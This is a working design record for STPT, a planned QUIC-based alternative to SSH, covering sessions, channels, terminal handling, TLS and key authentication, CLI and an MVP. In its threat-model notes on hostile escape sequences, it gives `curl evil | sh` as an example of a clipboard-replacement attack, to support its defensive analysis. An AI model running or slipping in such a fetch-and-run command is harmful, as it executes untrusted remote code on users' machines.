# STPT Design Decisions

Status: working record of design decisions and open questions. Not a normative wire protocol specification.
Origin: translated from the Russian summary "STPT_Decisions_v0.1" (2026-10-10) and extended with later decisions.
Everything here is open to discussion unless fixed in docs/RULES.md.

Marks: ✅ decided, ❓ open. Each mark carries a date.

# 1	Purpose
STPT is a standalone secure tool for remote terminal access and related operations, intended as an alternative to SSH.
The goal is not wire compatibility with SSH, but keeping its successful ideas while improving the session model and adding capabilities.
Do not create differences for the sake of differences.

- ❓ Final expansion of the name: "Secure Terminal Processor Tools" or "Secure Terminal Processing Tools".

# 2	Repositories and licensing
- ✅ 2026-10-10 Two independent repositories: `stpt` (Rust application, GPLv3) and `stpt-protocol` (protocol description, CC0 1.0).
- `stpt-protocol` contains documentation only. Formal message schemas, examples and test vectors are allowed later.
- The specification must be sufficient to build an independent implementation without reading the Rust sources.
- The protocol specification (`stpt-protocol/specs`) and the description of the implementation (`stpt/docs/ARCHITECTURE.md`) must not substitute for each other.

# 3	Platforms
- Application language: Rust.
- Primary platforms: Windows 11 x86-64 and Debian-based Linux x86-64.
- One source project; each platform build is a single binary acting as client and server, mode selected via CLI. Builds are platform-specific.
- Interactive terminal: PTY on Linux; ConPTY for a future Windows server mode.

# 4	Architectural model
- Endpoint, Client, Server, Connection, Channel, Stream, Identity, Account, Authentication Context, Session, Attachment and Retention Policy are distinct concepts (see PROTOCOL.md §1, §2).
- ✅ 2026-10-11 A Session is a server-side execution context owned by an Account, not only a terminal; the terminal is one of its Channels.
- ✅ 2026-10-11 Persistence is not a kind of Session: every Session is independent of Connections, and its life without an Attachment is set by the server Retention Policy. A new Connection may attach to it after authorization.
- ✅ 2026-10-11 Channel (logical service: control, terminal, files, other) and Stream (transport unit) are separate terms. Channels use bidirectional streams carrying framed messages (PROTOCOL.md §7.1); the control stream: PB004.
- ✅ 2026-10-11 The control Channel is client stream 0 and lives as long as the Connection; other Channels open with CHANNEL_OPEN on a new stream; before authentication QUIC stream limits allow only the control stream (PROTOCOL.md §8).
- ✅ 2026-10-11 State model (PROTOCOL.md §3): Authenticated is a Connection state, not only a property; until it only the control Channel is available. A Session has an Exited state that keeps the exit status for later Attachments under Retention Policy.
- ✅ 2026-10-11 A Connection is not bound to a network path: QUIC connection migration keeps the Connection; after Connection loss a new Connection is required.
- ✅ 2026-10-13 Terminal Channel (PROTOCOL.md §14): channel kind 1; other kinds (file transfer, client file access, port forwarding) assigned by their Tiers; Session and audit are not channel kinds. Opened only by the Client; opening = attach to a new or existing Session, closing = detach; Session termination is a control request. One Session has one terminal. Command execution without a PTY is a mode of the terminal Channel, not a separate kind. One bidirectional stream with in-band input, output, resize, signals and exit status; input is not split off (ordering). A Connection may have zero terminal Channels; the maximum is a Server limit via MAX_STREAMS (default 10). Message types are not limited to 255; frequent ones use one-byte CBOR values 1–23.
- ✅ 2026-10-13 Terminal parameters (PROTOCOL.md §14.6): PTY and command are independent fields; command as a string (run by the Account's shell) or as an argument vector (run directly, no quoting injection); TERM restricted to 1–64 bytes `[A-Za-z0-9][A-Za-z0-9._+-]*`; size 1–65535 cells, optional pixels; termios not transmitted, Server defaults with UTF-8 input; environment only through a Server allowlist (default `LANG`, `LC_*`), others ignored silently, the Client never forwards its whole environment; on attach only the size is allowed.
- ✅ 2026-10-13 Terminal I/O (PROTOCOL.md §14.7): TERMINAL_DATA both ways as opaque bytes; stderr without a PTY as a separate type TERMINAL_STDERR, so an implementation unaware of it fails closed instead of mixing streams; TERMINAL_EOF only without a PTY (stream FIN would block later signals); backpressure by QUIC flow control while attached; output of a detached Session: Tier PD. One-byte CBOR types 1–23 only for frequent messages.
- ✅ 2026-10-13 Terminal resize (PROTOCOL.md §14.8): TERMINAL_RESIZE (type 25) from the Client only, with a PTY only, same keys as pty-params, no reply; the Client coalesces bursts, the Server may apply only the last size and limit the rate; size choice with several Attachments: PD003.
- ✅ 2026-10-13 Signals (PROTOCOL.md §14.9): TERMINAL_SIGNAL (type 26) from the Client, no reply; STPT signal ids, not OS numbers: INT, QUIT, HUP, TERM, KILL, USR1, USR2; changes to the set only through a new roadmap item and a capability. Target: PTY foreground process group, or the process group of a command without a PTY. Delivered with the permissions of the Account, never of the Server process.
- SSH already multiplexes channels. The QUIC advantage is, among others, independent loss recovery per stream.

# 5	Transport and connection establishment
- ✅ 2026-10-10 QUIC over UDP with TLS 1.3. Candidate Rust library: `quinn` (with `rustls`).
- Order: QUIC/TLS handshake and server identity verification → STPT HELLO → version and capability negotiation → user authentication → Session create/attach.
- ✅ 2026-10-11 HELLO: one round trip CLIENT_HELLO → SERVER_HELLO on the control stream; the Server is silent until CLIENT_HELLO; HELLO is unsigned (protected by TLS); no implementation name or version anywhere in the protocol, unlike the SSH banner (PROTOCOL.md §10).
- No STPT banner or any application data is sent before the cryptographic channel is established.
- This does not make the protocol invisible: IP addresses, traffic metadata and QUIC itself remain observable. QUIC Initial packets are only obfuscated (their keys are derivable by anyone).
- ✅ 2026-10-10 ALPN and SNI travel in cleartext in the ClientHello. Where this exposes too much, Encrypted Client Hello (ECH) is to be used. Server-side ECH is restricted by gate G1.
- ✅ 2026-10-11 No 0-RTT at all, not even HELLO (supersedes 2026-10-10 "at most HELLO"): replay risk and capability exposure outweigh one saved round trip. May be relaxed later through a capability (PROTOCOL.md §6.5).
- ✅ 2026-10-11 TLS 1.3 profile: AES-128-GCM and ChaCha20-Poly1305 mandatory; key exchange X25519 mandatory, hybrid X25519MLKEM768 recommended and preferred; no client certificates; resumption only with (EC)DHE and never restores user authentication (PROTOCOL.md §6.2).
- QUIC connection migration (address change) and Session recovery after full connection loss are different mechanisms; both are in scope.
- ✅ 2026-10-11 Default port: dedicated UDP 843 (unassigned in the IANA registry; privileged, so not bindable by unprivileged local users). Sharing UDP 443 with HTTP/3 is not the default; the port is configurable (PROTOCOL.md §6.6).
- ❓ IANA registration of the ALPN token `stpt` (Expert Review) and of a port (system ports need IETF Review or IESG Approval, RFC 6335; a different number may be assigned): deferred until the specification is stable.

# 6	Authentication and security
- No custom cryptographic algorithms; only proven TLS and cryptographic implementations.
- ✅ 2026-10-11 Server identity: Ed25519 key presented as a TLS Raw Public Key (RFC 7250), no X.509; fingerprint `SHA256:<base64>` over SPKI, always compared in full; TOFU with SSH known_hosts-like UX, keyed by address and port; first contact needs user confirmation or an out-of-band fingerprint; a changed key aborts the Connection (PROTOCOL.md §9).
- ❓ Server key rotation (e.g. new key signed by the old one, sent after the handshake): postponed.
- ❓ Post-quantum or hybrid Server Identity keys (e.g. ML-DSA).
- ❓ CA model with X.509 certificates as an alternative to TOFU.
- ✅ 2026-10-10 User authentication happens at the STPT application layer after the TLS handshake. The client proves possession of its key by signing a value obtained from the TLS exporter of the current Connection (channel binding), so the proof cannot be reused on another Connection.
- ✅ 2026-10-11 User authentication: only Ed25519 public keys; one-step AUTH_REQUEST with a signature over a CBOR structure containing a TLS exporter value (label `EXPORTER-STPT-user-auth`); no key probing; uniform failure; the Account of a Connection never changes (PROTOCOL.md §12).
- ✅ 2026-10-11 No password authentication. To be reconsidered only on user demand, as a capability.
- Short-lived certificates, CA: promising, not required for the first MVP. Hybrid post-quantum key exchange: see §5.
- Authorization of Session attach and of client file system operations must be defined explicitly.
- The server never gets access to client files merely because a Connection exists.
- ❓ Security model of mounting a client directory on the server (reverse mount) requires a separate analysis.

# 7	Features
Core:
- secure connection to a remote terminal;
- full interactive PTY session: resize, control signals, terminal applications;
- persistent sessions: create, list, detach, reattach, terminate.

Later:
- native file transfer over STPT;
- requesting client files from a remote terminal session, with permissions only;
- mounting a client directory on the server (Linux FUSE; Windows needs a separate solution);
- session audit and terminal I/O recording;
- port forwarding;
- additional identity, deployment and hardening models.

Keystroke recording is not a reliable log of executed shell commands; secret handling and audit boundaries need separate design.
- ✅ 2026-10-13 Purpose of input recording: quick access to the command history of a Session through an STPT subcommand; input typed with echo off (passwords) is excluded. Recorded on the Server, not a separate stream of the terminal Channel.
- ❓ Protection of the Client terminal emulator against hostile escape sequences in output: to be analysed in Tier PJ. The protocol passes output unfiltered, like SSH (PROTOCOL.md §14.7). Threats from a hostile Server or a compromised process on it:
  - OSC 52: silent write to the Client clipboard, e.g. replacing a copied command with `curl evil | sh`;
  - query sequences whose replies come back as input (window title, status reports): with a title set beforehand this is command injection (past CVEs in xterm, iTerm2 and others);
  - OSC 8 hyperlinks whose visible text differs from the target.
  - ✅ 2026-10-13 No filtering in the protocol and no full escape-sequence parser: the Server cannot tell legitimate from hostile sequences, and a complex parser is new attack surface. Direction for PJ: an optional Client-side block of a small set of dangerous sequences (OSC 52 writes, queries with replies), leaving everything else intact; not applied when output goes to a file or pipe.
- ❓ How to extract commands reliably (raw keystrokes vs shell integration such as OSC 133 prompt marks): Tier PH.

# 8	CLI
- ✅ 2026-10-10 Commands are explicit: every operation has its own subcommand; no implicit forms such as `stpt user@host`.
- Preliminary shape (syntax not fixed):
  ```
  stpt server --listen <addr>:<port>
  stpt connect user@host[:port] [--new | --attach <session-id>]
  stpt sessions user@host
  stpt exec user@host "command"
  stpt fs pull|push|mount ...
  stpt keygen
  ```

# 9	Versioning and terminology
- Application version, wire protocol version, Tier and Gate are different entities.
- ✅ 2026-10-11 Requirements language BCP 14 (RFC 2119, RFC 8174); security requirements only as MUST / MUST NOT; OPTIONAL features never lower security; peer input untrusted, violations fail closed (PROTOCOL.md §0).
- ✅ 2026-10-11 Wire protocol version is a single integer; optional features via capabilities; draft versions disjoint from final; no fallback to a lower version; deprecated versions are never offered (PROTOCOL.md §5).
- ✅ 2026-10-11 The ALPN token is `stpt` without a version; the version is negotiated inside TLS (PROTOCOL.md §6.3).
- ✅ 2026-10-11 The roadmap is split into two tracks: protocol (P, docs/ROADMAP.md) and realisation (R, stpt/docs/ROADMAP.md). R items depend on P items explicitly; the protocol is specified ahead of the implementation.
- Tiers, items and gates: see docs/RULES.md §1.4, docs/ROADMAP.md, stpt/docs/ROADMAP.md, docs/GATES.md.

# 10	MVP on a local VM
First verifiable result:
- STPT server on a local Debian VM, STPT client on Windows 11;
- secure QUIC/TLS connection, server identity verification, minimal user authentication;
- bash through a PTY: interactive I/O, resize, Ctrl+C, nano/htop work;
- clean session termination.

Next experiment:
- open a Session, start a long-running process, drop the Connection;
- verify the process and PTY survive;
- open a new Connection and attach to the same Session.

# 11	Open questions before protocol work
- ✅ 2026-10-10 Message encoding: CBOR (RFC 8949) with CDDL schemas (RFC 8610).
- ✅ 2026-10-11 Framing: QUIC varint length + one CBOR message `[type, {int => any}]`; deterministic encoding, strict receiver rules; bidirectional streams only; bulk data always inside framed messages, no raw byte streams (PROTOCOL.md §7).
- ✅ 2026-10-11 Negotiation and extensions: draft wire versions 0xFF000000 + N (current 0xFF000001); the Server selects the highest common final, else common draft version; capabilities are a map id → parameters, offered by the Client and selected by the Server; one message type space with core, capability and private ranges; unknown message types close the Connection; GREASE values reserved (PROTOCOL.md §11).
- ✅ 2026-10-11 Server identity and first-contact trust (§6). Key rotation: ❓ §6.
- ✅ 2026-10-11 User authentication methods (§6). ❓ Access rights within an Account (Tier PI).
- ❓ Session ID, ownership, lifetimes, attach/detach, concurrent access.
- ✅ 2026-10-11 Errors via QUIC CONNECTION_CLOSE / RESET_STREAM codes, no error message; no reason text before authentication; timeouts HELLO 10 s, authentication 60 s, idle 60 s with client PING every 15 s; limits announced in HELLO (message size ≥ 65535), nesting depth 16, 6 auth attempts; QUIC Retry and limits on unauthenticated Connections (PROTOCOL.md §13).
- ❓ How a command inside the remote shell reaches the client without breaking trust boundaries.
- ❓ Audit format and security, including password and secret input.
- ❓ Interoperability of independent implementations and test vectors.

# 12	Working principle
First define the state model and responsibility boundaries, then the wire format, only then the implementation.
Start with a narrow MVP verifiable on a local VM.
